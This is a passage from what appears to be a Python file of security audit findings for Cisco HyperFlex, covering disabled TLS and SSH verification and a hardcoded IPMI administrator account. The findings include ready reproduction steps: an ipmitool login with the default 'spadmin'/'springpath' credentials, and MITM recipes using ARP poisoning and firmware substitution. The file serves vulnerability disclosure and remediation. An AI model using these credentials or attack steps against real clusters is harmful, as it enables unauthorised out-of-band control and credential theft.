    "title": "Global JVM SSL Bypass via trust-all TrustManager in HyperFlex Upgrade Service",
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": "upgrade-war/WEB-INF/classes/com/springpath/hxupgrade/service/UpgradeSvcAccess",
    "description": (
        "UpgradeSvcAccess.openClientConnection() calls trustAll() before opening "
        "any Thrift/HTTPS transport. trustAll() installs a no-op X509TrustManager "
        "(checkServerTrusted returns immediately without checking) and a no-op "
        "HostnameVerifier (verify() always returns true) as JVM-wide defaults via "
        "HttpsURLConnection.setDefaultSSLSocketFactory() and "
        "HttpsURLConnection.setDefaultHostnameVerifier(). Because these are global "
        "JVM statics, every subsequent HTTPS request made anywhere in the upgrade "
        "service process — including firmware download, catalog validation, and "
        "inter-service communication — is rendered vulnerable to MITM attack. "
        "A network-positioned attacker can intercept upgrade traffic and substitute "
        "malicious firmware images or manipulate cluster state during the upgrade workflow."
    ),
    "evidence": (
        "upgrade-war/WEB-INF/classes/com/springpath/hxupgrade/service/"
        "UpgradeSvcAccess.class openClientConnection():\n"
        "  11: invokestatic #154 // Method trustAll:()V\n\n"
        "trustAll() body:\n"
        "  new UpgradeSvcAccess$1  // X509TrustManager: checkServerTrusted() { return; }\n"
        "  SSLContext.init(null, [trustManager], new SecureRandom())\n"
        "  HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory())\n"
        "  new UpgradeSvcAccess$2  // HostnameVerifier: verify() { return true; }\n"
        "  HttpsURLConnection.setDefaultHostnameVerifier(hostnameVerifier)\n\n"
        "UpgradeSvcAccess$1.checkServerTrusted: Code: 0: return\n"
        "UpgradeSvcAccess$2.verify: Code: 0: iconst_1; 1: ireturn"
    ),
    "reproduction": (
        "Position a TLS MITM proxy between the stCtlVM and the Thrift upgrade endpoint. "
        "Trigger a cluster upgrade via the HyperFlex Connect UI or REST API. "
        "Observe that the upgrade service connects to the MITM proxy without "
        "certificate validation errors. Substitute a crafted firmware package in "
        "the MITM response."
    ),
    "remediation": (
        "Remove the trustAll() call and use the JVM's default trust store. "
        "Install the HyperFlex CA certificate into the upgrade service trust store "
        "and validate server identity against it. Do not set global JVM-wide SSL "
        "defaults; configure verification per-connection using a dedicated SSLContext."
    ),
    "references": ["CWE-295", "CWE-297"],
}

for _f in [
    HX_F249,
]:
    FINDINGS[_f["id"]] = _f
HX_F254 = {
    "id": "HX-F254",
    "title": "Hardcoded IPMI Backdoor Account Created During Node Replacement",
    "cwe": "CWE-798",
    "severity": "HIGH",
    "cvss": 8.1,
    "component": "mgmt/opt/hyperflex/storfs-deploy/ansible/replaceNode.sh",
    "description": (
        "replaceNode.sh creates an IPMI user account 'spadmin' (user ID 10) on every "
        "HyperFlex node during node replacement and sets its password to the hardcoded "
        "value 'springpath' via ipmitool. The account is granted Administrator-level "
        "privileges (privilege level 4) on IPMI channel 1 and explicitly enabled. "
        "IPMI (port 623/UDP) provides out-of-band management including power control, "
        "serial-over-LAN console access, sensor readings, and hardware-level system "
        "administration. Any attacker with network access to the IPMI/BMC management "
        "interface can authenticate as 'spadmin'/'springpath' and gain full out-of-band "
        "control of every replaced HyperFlex node regardless of OS-level authentication. "
        "The hardcoded password is embedded in production firmware and applied "
        "programmatically during the node replacement workflow."
    ),
    "evidence": (
        "replaceNode.sh line 271-276:\n"
        "  echo 'Adding Springpath User to Appliance using ipmitool'\n"
        "  runCmdOnEsx /opt/cisco/support/ipmitool user set name 10 spadmin\n"
        "  runCmdOnEsx /opt/cisco/support/ipmitool user set password 10 springpath  # hardcoded\n"
        "  runCmdOnEsx /opt/cisco/support/ipmitool user priv 10 4 1  # Administrator on channel 1\n"
        "  runCmdOnEsx /opt/cisco/support/ipmitool user enable 10\n\n"
        "runCmdOnEsx executes commands on the target ESXi host via SSH."
    ),
    "reproduction": (
        "Identify a HyperFlex node's IPMI IP from the management network. "
        "Attempt IPMI authentication: ipmitool -I lanplus -H <ipmi_ip> -U spadmin -P springpath sdr. "
        "If node replacement was run, this succeeds and grants out-of-band administrative access."
    ),
    "remediation": (
        "Remove the hardcoded password from replaceNode.sh. Generate a per-node random password "
        "using 'openssl rand -hex 16' and store it in the cluster's credential vault. "
        "Alternatively, require the IPMI admin password as an Ansible vault secret rather "
        "than embedding it in the playbook. Audit all deployed nodes for the 'spadmin' account "
        "and rotate its password immediately."
    ),
    "references": ["CWE-798", "CWE-1393"],
}


HX_F256 = {
    "id": "HX-F256",
    "title": "No-Op X509TrustManager in Java Inter-Service Thrift and REST Clients",
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": "mgmt/opt/hyperflex/storfs-mgmt/dependencies/lib/common-1.0.jar",
    "description": (
        "Three anonymous X509TrustManager implementations in common-1.0.jar have empty "
        "checkServerTrusted() and checkClientTrusted() method bodies (bytecode: 0: return). "
        "StMgrThriftClientFactory$$anon$1 is used for all Thrift TLS connections to the "
        "Storage Manager service. StDataSvcClientFactory$$anon$1 is used for Thrift TLS "
        "connections to the Data Service Manager. ScopeResolver$1 (in the REST client "
        "SSO scope resolver) also returns null from getAcceptedIssuers() and performs no "
        "certificate validation. Any server certificate is accepted unconditionally, exposing "
        "all inter-service communication to TLS MitM. Services using these factories include "
        "hxSvcMgr, hxSecuritySvcMgr, stSSOMgr, hxIscsiMgr, and stNodeMgr."
    ),
    "evidence": (
        "common-1.0.jar: StMgrThriftClientFactory$$anon$1 (StMgrThriftClientFactory.scala):\n"
        "  public void checkClientTrusted(X509Certificate[], String) { return; }  // no-op\n"
        "  public void checkServerTrusted(X509Certificate[], String) { return; }  // no-op\n"
        "  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n"
        "\n"
        "common-1.0.jar: StDataSvcClientFactory$$anon$1 (StDataSvcMgrThriftClientFactory.scala):\n"
        "  public void checkClientTrusted(X509Certificate[], String) { return; }  // no-op\n"
        "  public void checkServerTrusted(X509Certificate[], String) { return; }  // no-op\n"
        "\n"
        "common-1.0.jar: ScopeResolver$1 (ScopeResolver.java):\n"
        "  public void checkServerTrusted(X509Certificate[], String) { return; }  // no-op\n"
        "  public X509Certificate[] getAcceptedIssuers() { return null; }          // null\n"
        "\n"
        "javap bytecode confirmation:\n"
        "  public void checkServerTrusted(java.security.cert.X509Certificate[], java.lang.String);\n"
        "    Code:\n"
        "       0: return"
    ),
    "reproduction": (
        "Position a MitM between any two HyperFlex management services (stMgr, "
        "hxSvcMgr, stSSOMgr) and present a self-signed TLS certificate. The "
        "connection is accepted without certificate validation. Can be triggered via "
        "ARP poisoning or DNS spoofing on the management VLAN."
    ),
    "remediation": (
        "Replace anonymous TrustManager implementations with proper certificate chain "
        "validation using the cluster's internal CA. Use TrustManagerFactory.getInstance("
        "TrustManagerFactory.getDefaultAlgorithm()) initialized with the HyperFlex "
        "keystore at /etc/hyperflex/secure/hyperflex_keystore.jceks. "
        "Remove the no-op anonymous inner class pattern from all client factories."
    ),
    "references": ["CWE-295", "CWE-297"],
}

HX_F260 = {
    "id": "HX-F260",
    "title": "Global TLS Trust-All and Hostname Verifier Bypass via WebDownloader Static Init (ROOT + supportservice WARs)",
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "restapi/opt/hyperflex/storfs-restapi/ROOT-1.0.0.war, "
        "restapi/opt/hyperflex/storfs-restapi/supportservice-1.0.0.war"
    ),
    "description": (
        "WebDownloader.java appears in two REST API WARs — ROOT-1.0.0.war "
        "(com.storvisor.sysmgmt.service.WebDownloader) and supportservice-1.0.0.war "
        "(com.springpath.hx.support.util.WebDownloader) — and both carry identical static "
        "initializer blocks that execute at class-load time. Each static block calls "
        "trustAllHttpsCertificates(), which constructs an SSLContext with a no-op "
        "TrustAllManager (checkServerTrusted: Code: 0: return) and installs it globally "
        "via HttpsURLConnection.setDefaultSSLSocketFactory(). The block also installs a "
        "HostnameVerifier (WebDownloader$2) via setDefaultHostnameVerifier(); that "
        "verifier unconditionally returns true (iconst_1; ireturn). Both calls install "
        "JVM-wide defaults that affect every HttpsURLConnection in the webapp context, "
        "not only those created by WebDownloader. The complete HTTPS surface of both "
        "webapps is susceptible to TLS MITM."
    ),
    "evidence": (
        "ROOT-1.0.0.war: com.storvisor.sysmgmt.service.WebDownloader (javap -c):\n"
        "\n"
        "  static {};\n"
        "    Code:\n"
        "       0: invokestatic  #54  // trustAllHttpsCertificates:()V\n"
        "       3: new           #59  // class WebDownloader$2 (HostnameVerifier)\n"
        "      10: invokestatic  #62  // HttpsURLConnection.setDefaultHostnameVerifier\n"
        "\n"
        "  TrustAllManager.checkServerTrusted: Code: 0: return   // no-op\n"
        "  WebDownloader$2.verify: Code: 0: iconst_1; 1: ireturn // always true\n"
        "\n"
        "supportservice-1.0.0.war: com.springpath.hx.support.util.WebDownloader — "
        "identical static initializer (invokestatic #54 trustAllHttpsCertificates, "
        "invokestatic #62 setDefaultHostnameVerifier); same TrustAllManager no-op "
        "and WebDownloader$2 always-true verifier confirmed by javap."
    ),
    "reproduction": (
        "Position a MitM between either webapp and any downstream HTTPS target. "
        "Present a self-signed certificate with a mismatched hostname. "
        "Connection succeeds without error. No special configuration required; "
        "the global override is set at class load."
    ),
    "remediation": (
        "Remove trustAllHttpsCertificates() and its static initializer call from "
        "both WebDownloader implementations. Replace with proper certificate "
        "validation against the cluster trust store at "
        "/etc/hyperflex/secure/hyperflex_keystore.jceks. "
        "Remove the global hostname verifier override."
    ),
    "references": ["CWE-295", "CWE-297"],
}

HX_F261 = {
    "id": "HX-F261",
    "title": "No-op TrustManagers in REST API WAR Inter-Service Client Factories (13 Classes, 6 WARs)",
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "restapi/opt/hyperflex/storfs-restapi/ROOT-1.0.0.war, "
        "restapi/opt/hyperflex/storfs-restapi/encryption-1.0.0.war, "
        "restapi/opt/hyperflex/storfs-restapi/iscsi-1.0.0.war, "
        "restapi/opt/hyperflex/storfs-restapi/securityservice-1.0.0.war, "
        "restapi/opt/hyperflex/storfs-restapi/slservice-1.0.0.war, "
        "restapi/opt/hyperflex/storfs-restapi/supportservice-1.0.0.war"
    ),
    "description": (
        "Thirteen anonymous TrustManager implementations across six REST API WARs implement "
        "X509TrustManager with an empty checkServerTrusted method (bytecode: Code: 0: return) "
        "and a null-returning getAcceptedIssuers. These are passed to per-connection "
        "SSLContext instances used by the inter-service client factories that call back to "
        "storfs-mgmt Thrift and HyperFlex service endpoints. No certificate chain is "
        "validated before the connection proceeds. An attacker in a position to intercept "
        "inter-service traffic (compromised cluster node, ARP poisoning on the management "
        "VLAN) can terminate these connections with a forged certificate and read or modify "
        "the plaintext. Affected classes: ROOT — HxSupportSvcAccess$1, ServiceAccess$1; "
        "encryption — StMgrClient$1; iscsi — StMgrClient$1, HxSvcMgrClient$1, "
        "HxIscsiMgrClient$1, HxIscsiCloneMgrClient$1; securityservice — StMgrClient$1, "
        "HxSecuritySvcMgrClient$1, HxSvcMgrClient$1; slservice — HxSupportSvcClient$1; "
        "supportservice — HxSupportSvcClient$1, StMgrClient$1, HxSvcMgrClient$1."
    ),
    "evidence": (
        "Representative bytecode (identical pattern in all 13 classes):\n"
        "\n"
        "  ROOT-1.0.0.war: com.storvisor.sysmgmt.bootstrap.util.ServiceAccess$1\n"
        "  implements javax.net.ssl.X509TrustManager\n"
        "\n"
        "  public void checkServerTrusted(X509Certificate[], String) throws CertificateException;\n"
        "    Code:\n"
        "       0: return        // no-op; no certificate check performed\n"
        "\n"
        "  public X509Certificate[] getAcceptedIssuers();\n"
        "    Code:\n"
        "       0: aconst_null\n"
        "       1: areturn       // returns null; all issuers implicitly accepted\n"
        "\n"
        "  Full affected set (javap-verified, checkServerTrusted: Code: 0: return):\n"
        "  ROOT-1.0.0.war:\n"
        "    com.storvisor.sysmgmt.bootstrap.util.HxSupportSvcAccess$1\n"
        "    com.storvisor.sysmgmt.bootstrap.util.ServiceAccess$1\n"
        "  encryption-1.0.0.war:\n"
        "    com.springpath.hx.encryption.clients.StMgrClient$1\n"
        "  iscsi-1.0.0.war:\n"
        "    com.springpath.hx.iscsi.gateway.StMgrClient$1\n"
        "    com.springpath.hx.iscsi.gateway.HxSvcMgrClient$1\n"
        "    com.springpath.hx.iscsi.gateway.HxIscsiMgrClient$1\n"
        "    com.springpath.hx.iscsi.gateway.HxIscsiCloneMgrClient$1\n"
        "  securityservice-1.0.0.war:\n"
        "    com.springpath.hx.security.gateway.StMgrClient$1\n"
        "    com.springpath.hx.security.gateway.HxSecuritySvcMgrClient$1\n"
        "    com.springpath.hx.security.gateway.HxSvcMgrClient$1\n"
        "  slservice-1.0.0.war:\n"
        "    com.springpath.hx.sl.clients.HxSupportSvcClient$1\n"
        "  supportservice-1.0.0.war:\n"
        "    com.springpath.hx.support.clients.HxSupportSvcClient$1\n"
        "    com.springpath.hx.support.clients.StMgrClient$1\n"
        "    com.springpath.hx.support.clients.HxSvcMgrClient$1"
    ),
    "reproduction": (
        "ARP-poison or route-redirect the management VLAN between two cluster nodes. "
        "Present a self-signed certificate on the forged endpoint. "
        "The affected client factory will accept it without error, "
        "completing the TLS handshake against the attacker-controlled certificate."
    ),
    "remediation": (
        "Replace all anonymous TrustManager implementations in these client factories "
        "with proper validation against the HyperFlex cluster trust store at "
        "/etc/hyperflex/secure/hyperflex_keystore.jceks. "
        "Extract a shared validated SSLContext factory (see "
        "X509ExtendedTrustManager_Storvisor in common-1.0.jar which already implements "
        "the correct pattern when certificateCheckingEnabled=true) and use it "
        "consistently across all inter-service clients."
    ),
    "references": ["CWE-295"],
}

HX_F263 = {
    "id": "HX-F263",
    "title": "TLS Certificate Verification Disabled in Python Management REST Client (swagger_api_client.py)",
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": "mgmt/opt/hyperflex/restClientModule/swagger_api_client.py",
    "description": (
        "swagger_api_client.py in the storfs-mgmt Python management layer disables TLS "
        "certificate verification on all outbound HTTPS connections to the HyperFlex REST "
        "API and upgrade agent endpoints. Three separate assignment sites set verify_ssl = "
        "False: once on the package-level configuration object (affecting all default "
        "swagger clients in the package), once on a per-call Configuration() for the "
        "coreapi client, and once on AgentConfiguration() for the upgrade_agent client. "
        "The module also suppresses urllib3 InsecureRequestWarning via "
        "urllib3.disable_warnings(), preventing any log-level indication that verification "
        "is skipped. These connections authenticate with root session tokens read from "
        "/etc/hyperflex/secure/root_file.pub; suppressing TLS verification exposes those "
        "tokens to interception on the management network."
    ),
    "evidence": (
        "mgmt/opt/hyperflex/restClientModule/swagger_api_client.py:\n"
        "\n"
        "  def generate_client_methods(self, name):\n"
        "    pkg = __import__('swagger_' + str(name))\n"
        "    pkg.rest.urllib3.disable_warnings()          # suppress InsecureRequestWarning\n"
        "    pkg.configuration.verify_ssl = False         # (1) global package config\n"
        "\n"
        "    if client_name == 'swagger_coreapi':\n"
        "      configuration = Configuration()\n"
        "      configuration.verify_ssl = False           # (2) coreapi client\n"
        "\n"
        "    if client_name == 'swagger_upgrade_agent':\n"
        "      agentConfig = AgentConfiguration()\n"
        "      agentConfig.verify_ssl = False             # (3) upgrade agent client\n"
        "\n"
        "  BASE_URL_FORMAT = 'https://{}/{}'             # HTTPS with verify disabled\n"
        "  Endpoints: coreapi/v1, upgradeagent/v1"
    ),
    "reproduction": (
        "MitM the management network between the storfs-mgmt process and the REST API "
        "listeners (coreapi/v1, upgradeagent/v1). Present a self-signed certificate. "
        "swagger_api_client accepts it without error. Root session tokens transmitted "
        "in the session are captured by the interceptor."
    ),
    "remediation": (
        "Remove all verify_ssl = False assignments. Configure each Swagger client with "
        "the cluster CA certificate bundle at /etc/hyperflex/secure/hyperflex_keystore.jceks "
        "as the trusted CA store. Remove the urllib3.disable_warnings() call."
    ),
    "references": ["CWE-295"],
}

HX_F268 = {
    "id": "HX-F268",
    "title": "TLS Verification Defaulted to False in stCli REST Utility Functions (runRestQueries/restWithRetry)",
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": "mgmt/opt/hyperflex/stcli-1.0.0.egg/stCli/commonFunctions.py",
    "description": (
        "Both REST utility functions in stCli/commonFunctions.py default verify=False, "
        "disabling TLS certificate verification for all HTTPS requests made through "
        "these functions. runRestQueries() additionally calls "
        "requests.packages.urllib3.disable_warnings(InsecureRequestWarning) at call time, "
        "suppressing any urllib3 warning that would otherwise appear in logs. "
        "When useRootSessionId=True, runRestQueries reads the root session token from "
        "/etc/hyperflex/secure/root_file.pub and adds it as X-RootSessionID to the "
        "request headers — this privileged token is transmitted over an HTTPS connection "
        "with no certificate validation."
    ),
    "evidence": (
        "stCli/commonFunctions.py:\n"
        "\n"
        "  def restWithRetry(..., verify=False):              # L8: default verify=False\n"
        "    response = restFn(..., verify=verify, ...)       # L13: passed through\n"
        "\n"
        "  def runRestQueries(..., verify=False):             # L29: default verify=False\n"
        "    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  # L33\n"
        "    if useRootSessionId:\n"
        "      rootSessionId = open('/etc/hyperflex/secure/root_file.pub').read()\n"
        "      headers = {'X-RootSessionID': rootSessionId,  # root token in clear\n"
        "                 'X-LoggedInUser': 'admin',         # hardcoded user identity\n"
        "                 'X-Scope': 'READ,MODIFY'}\n"
        "    return restWithRetry(requests.get/post/put, ..., verify=verify)  # verify=False"
    ),
    "reproduction": (
        "MitM the management network. Present a self-signed certificate to any stCli "
        "REST call that uses useRootSessionId=True. The root session token is visible "
        "in the captured HTTP headers. No error or warning is logged."
    ),
    "remediation": (
        "Change the default value of verify from False to the path of the cluster CA "
        "certificate bundle. Remove the urllib3.disable_warnings call. Callers that "
        "currently pass no verify argument will automatically get proper verification."
    ),
    "references": ["CWE-295"],
}

HX_F269 = {
    "id": "HX-F269",
    "title": "SSH Host Key Verification Disabled via AutoAddPolicy in 30+ Management Scripts (17 Files)",
    "cwe": "CWE-322",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "usr/share/hyperflex/storfs-misc/ (12 Python files), "
        "factory/opt/hyperflex/storfs-factory/utils/commonFunctions.py, "
        "factory/opt/hyperflex/storfs-factory/ansible/library/factory_datastore.py"
    ),
    "description": (
        "Over 20 Paramiko SSH client instances across 12 HyperFlex management, "
        "upgrade, and validation scripts set the host key policy to "
        "paramiko.AutoAddPolicy(), which automatically accepts any SSH server's "
        "host key on first connection without user confirmation or verification. "
        "This disables SSH host key authentication entirely: an on-path attacker "
        "can present a forged host key and intercept all SSH sessions, including "
        "those that transmit cluster node passwords and administrator credentials. "
        "Particularly significant: stig_security_settings.py and "
        "stig_security_settings_hx.py — the scripts responsible for applying STIG "
        "security hardening to HyperFlex nodes — use AutoAddPolicy() when "
        "connecting to nodes to apply the hardening, meaning the STIG compliance "
        "enforcement path is itself susceptible to the MITM attacks it is intended "
        "to prevent."
    ),
    "evidence": (
        "Confirmed AutoAddPolicy instances (paramiko grep):\n"
        "  storfs-misc/uninstall_cluster.py:64\n"
        "  storfs-misc/listzkdb.py:41\n"
        "  storfs-misc/cleanNasStaleMounts.py:20\n"
        "  storfs-misc/hx-scripts/stig_security_settings.py:364, :382\n"
        "  storfs-misc/hx-scripts/stig_security_settings_hx.py:476\n"
        "  storfs-misc/hx-scripts/post_install.py:712, :1219\n"
        "  storfs-misc/hx-scripts/node_replace.py:237, :324, :666, :674\n"
        "  storfs-misc/validation/springpath_ssh.py:46\n"
        "  storfs-misc/validation/springpath_hardware_validator.py:96\n"
        "  storfs-misc/validation/springpath_networking.py:648\n"
        "  storfs-misc/validation/springpath_security.py:115, :128\n"
        "  storfs-misc/validation/springpath_validation_util.py:31, :45\n"
        "  storfs-misc/validation/springpath_vmware.py:325, :355\n"
        "  storfs-misc/validation/springpath_validation_validator.py:2190\n"
        "  storfs-misc/validation/commonFunctions.py:273, :660\n"
        "  storfs-misc/upgrade-hooks/.../0006_RestoreNFSAccessRules_ESX.py:89\n"
        "  storfs-misc/upgrade-hooks/.../9998_remove_host_authorized_keys_ESX.py:24\n"
        "  storfs-factory/utils/commonFunctions.py:273, :660\n"
        "  storfs-factory/ansible/library/factory_datastore.py:131\n"
        "\n"
        "Representative pattern:\n"
        "  client = paramiko.SSHClient()\n"
        "  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "  client.connect(address, username=username, password=password)"
    ),
    "reproduction": (
        "ARP-spoof the management network to intercept SSH connections from a "
        "management node to any cluster node. Present a forged host key on the "
        "intercepting endpoint. AutoAddPolicy causes paramiko to accept the key "
        "unconditionally and proceed with the SSH handshake. Capture the "
        "plaintext password after it is sent in the SSH authentication exchange."
    ),
    "remediation": (
        "Replace paramiko.AutoAddPolicy() with paramiko.RejectPolicy() or "
        "paramiko.WarningPolicy(). Load known cluster node host keys from a "
        "pre-populated known_hosts file (e.g., /etc/ssh/ssh_known_hosts or a "
        "cluster-specific store) using SSHClient.load_host_keys() before "
        "connecting. Refuse connections to hosts whose keys are not pre-loaded."
    ),
    "references": ["CWE-322", "CWE-297"],
}

HX_F271 = {
    "id": "HX-F271",
    "title": "Systemic TLS Verification Bypass (verify=False) Across 13 storfs-misc Management Scripts (60+ Instances)",
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "usr/share/hyperflex/storfs-misc/hx-scripts/ (8 files), "
        "usr/share/hyperflex/storfs-misc/validation/ (4 files), "
        "usr/share/hyperflex/storfs-misc/upgrade-hooks/ (1 file)"
    ),
    "description": (
        "Across 13 Python management scripts in the storfs-misc package, "
        "requests library calls universally pass verify=False, disabling TLS "
        "certificate verification for all HTTPS connections to the HyperFlex "
        "management REST API and external endpoints. The pattern is systemic — "
        "over 60 individual call sites in post-install, support, upgrade, "
        "cluster-node-replace, validation, and certificate management scripts. "
        "Particularly significant: nginxCertManager.py passes verify=False when "
        "uploading newly signed certificates to the REST endpoint, meaning the "
        "certificate rotation workflow — which exists to improve TLS security — "
        "is itself susceptible to TLS MITM during the upload. Scripts that use "
        "admin credentials for REST authentication (support.py, post_install.py, "
        "node_replace.py) expose those credentials to interception."
    ),
    "evidence": (
        "Confirmed files and call counts (grep for verify=False):\n"
        "  hx-scripts/support.py                   — 16 instances\n"
        "  hx-scripts/post_install.py               — 10 instances\n"
        "  hx-scripts/check_vswitch.py              — 7 instances\n"
        "  hx-scripts/node_replace.py               — 5 instances\n"
        "  hx-scripts/whitelist.py                  — 3 instances\n"
        "  hx-scripts/nginxCertManager.py           — 1 instance (cert upload path)\n"
        "  hx-scripts/esx_util.py                   — 1 instance\n"
        "  hx-scripts/install_vc_plugin.py          — 1 instance\n"
        "  validation/springpath_lib_validate_cluster_node_model.py — 3 instances\n"
        "  validation/commonFunctions.py            — 1 instance\n"
        "  validation/springpath_validation_validator.py — 1 instance\n"
        "  validation/springpath_vmware.py          — 2 instances\n"
        "  upgrade-hooks/.../0005_remove_eam_ESX.py — 3 instances\n"
        "\n"
        "Representative pattern (post_install.py):\n"
        "  r = requests.get('https://' + mgmtIp, verify=False)\n"
        "  r = requests.post(url, auth=(admin_user, password), verify=False)\n"
        "\n"
        "Certificate manager irony (nginxCertManager.py L110):\n"
        "  resp = restFn(url=restUrl, data=data, auth=auth, headers=headers,\n"
        "                verify=False)  # cert upload with TLS bypass"
    ),
    "reproduction": (
        "MitM the management network during any HyperFlex management operation "
        "(post-install, node replace, validation, cert rotation). Present a "
        "forged certificate. Any of the 13 affected scripts will accept it and "
        "transmit admin credentials or management tokens without error."
    ),
    "remediation": (
        "Audit all requests calls in storfs-misc and replace verify=False with "
        "verify=<ca_bundle_path> pointing to the cluster CA. Centralize TLS "
        "configuration in a shared utility that enforces certificate verification "
        "by default — this prevents future regressions. The cluster CA bundle "
        "is available at /etc/hyperflex/secure/hyperflex_keystore.jceks "
        "or the PEM equivalent."
    ),
    "references": ["CWE-295"],
}

HX_F272 = {
    "id": "HX-F272",
    "title": (
        "No-op TrustManagers in hxSecuritySvcMgr Thrift Service JAR "
        "(com.cisco.hxdp Namespace, 2 Classes)"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-mgmt/hxSecuritySvcMgr-1.0/lib/"
        "hxSecuritySvcMgr-1.0.jar — "
        "com.cisco.hxdp.sysmgmt.hxSecuritySvcMgr.gateway.stMgr.StMgrClient$1, "
        "com.cisco.hxdp.sysmgmt.hxSecuritySvcMgr.gateway.hxSvcMgr.HxSvcMgrClient$1"
    ),
    "description": (
        "Two anonymous X509TrustManager implementations in the hxSecuritySvcMgr "
        "Thrift service JAR implement checkServerTrusted as a no-op (bytecode: "
        "Code: 0: return). These classes are in the com.cisco.hxdp.sysmgmt "
        "namespace — the post-Cisco-acquisition codebase layer — distinct from "
        "the com.springpath.hx and com.storvisor.sysmgmt packages covered in "
        "HX-F261. The hxSecuritySvcMgr service manages certificate lifecycle, "
        "security policy enforcement, and authentication state for the HyperFlex "
        "cluster; its outbound Thrift connections to stMgr and hxSvcMgr use "
        "these bypassed TrustManagers, meaning the security service itself "
        "cannot detect MITM against its control-plane calls."
    ),
    "evidence": (
        "Bytecode-verified via javap (both classes identical pattern):\n"
        "\n"
        "  com.cisco.hxdp.sysmgmt.hxSecuritySvcMgr.gateway.stMgr.StMgrClient$1\n"
        "  implements javax.net.ssl.X509TrustManager\n"
        "\n"
        "  public void checkServerTrusted(X509Certificate[], String) throws CertificateException;\n"
        "    Code:\n"
        "       0: return        // no-op; no certificate check performed\n"
        "\n"
        "  com.cisco.hxdp.sysmgmt.hxSecuritySvcMgr.gateway.hxSvcMgr.HxSvcMgrClient$1\n"
        "  implements javax.net.ssl.X509TrustManager\n"
        "\n"
        "  public void checkServerTrusted(X509Certificate[], String) throws CertificateException;\n"
        "    Code:\n"
        "       0: return        // no-op; no certificate check performed\n"
        "\n"
        "Package prefix com.cisco.hxdp confirms this is post-acquisition code, "
        "not the original Springpath codebase. The same bypass pattern present "
        "in Springpath-origin code (HX-F261) was carried forward into Cisco-authored code."
    ),
    "reproduction": (
        "ARP-poison or route-redirect the management VLAN. "
        "Present a forged certificate on the stMgr (localhost:9333) or "
        "hxSvcMgr endpoint. hxSecuritySvcMgr will accept it without error."
    ),
    "remediation": (
        "Replace both anonymous TrustManager implementations with validation "
        "against the cluster trust store at /etc/hyperflex/secure/hyperflex_keystore.jceks. "
        "The presence of this pattern in com.cisco.hxdp-namespaced code indicates "
        "the vulnerability was introduced during Cisco development, not only inherited "
        "from the Springpath acquisition."
    ),
    "references": ["CWE-295"],
}

HX_F274 = {
    "id": "HX-F274",
    "title": (
        "Global Python SSL Monkey-Patch in storfs-factory Provisioning Modules "
        "(4 Files: configureEsx, factory_datastore, reserveMem, pci_passthru)"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "factory/opt/hyperflex/storfs-factory/ansible/library/configureEsx.py (L68), "
        "factory/opt/hyperflex/storfs-factory/ansible/library/factory_datastore.py (L229), "
        "factory/opt/hyperflex/storfs-factory/ansible/library/reserveMem.py (L62), "
        "factory/opt/hyperflex/storfs-factory/utils/pci_passthru.py (L786)"
    ),
    "description": (
        "Four storfs-factory provisioning module files apply the "
        "ssl._create_default_https_context = ssl._create_unverified_context monkey-patch, "
        "disabling TLS certificate validation process-wide before connecting to ESX hosts "
        "via the VMware vSphere API (pyVmomi). The provisioning phase is particularly "
        "sensitive — configureEsx.py configures firewall and power policies on ESX nodes, "
        "factory_datastore.py creates factory datastores and reads boot disk configurations, "
        "reserveMem.py allocates reserved memory, and pci_passthru.py configures PCI "
        "passthrough devices for ESX hosts. An attacker on the provisioning network "
        "can MITM any ESX API call during factory deployment, intercepting ESX credentials "
        "or injecting arbitrary vSphere API responses to alter provisioning outcomes "
        "(e.g., misconfigure firewall rules, manipulate datastore targets, assign wrong PCI "
        "passthrough devices). This is the same monkey-patch pattern found in "
        "stcli-egg/StTransportBase.py (HX-F267) and appliance/config-ctlvm.py (HX-F267), "
        "now confirmed in four factory provisioning modules."
    ),
    "evidence": (
        "Pattern identical across all four files:\n"
        "\n"
        "  configureEsx.py L68:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    (inside main(), before ConnectVimHost() — disables cert validation for ESX API)\n"
        "\n"
        "  factory_datastore.py L229:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    (inside main(), before SmartConnect to ESX for datastore operations)\n"
        "\n"
        "  reserveMem.py L62:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    (inside main(), before ESX API call for memory reservation config)\n"
        "\n"
        "  pci_passthru.py L786:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    (inside main(), before connect.Connect() for PCI passthrough config)\n"
        "    Note: identical file also deployed at "
        "usr/share/hyperflex/storfs-misc/pci_passthru.py (see HX-F278)\n"
        "\n"
        "  All four follow the 'try/except: pass' pattern — the bypass is silent even "
        "if ssl module is unavailable, with no fallback to verified mode."
    ),
    "reproduction": (
        "During factory provisioning, ARP-poison the provisioning network between "
        "the installer and ESX hosts. Present a forged ESX HTTPS certificate. "
        "configureEsx, factory_datastore, and reserveMem will accept it without error "
        "and proceed with provisioning against the attacker-controlled endpoint."
    ),
    "remediation": (
        "Remove all three ssl._create_default_https_context assignments. "
        "Use ssl.create_default_context() with verify_mode=ssl.CERT_REQUIRED and "
        "the ESX host's trusted CA. For pyVmomi, set sslContext explicitly in SmartConnect. "
        "This is the same root cause as HX-F267; apply the same fix pattern."
    ),
    "references": ["CWE-295"],
}

HX_F276 = {
    "id": "HX-F276",
    "title": (
        "TLS Certificate Verification Disabled (verify=False) in storfs-stretched "
        "switchToArbitrator.py Cluster Failover Script"
    ),
    "cwe": "CWE-295",
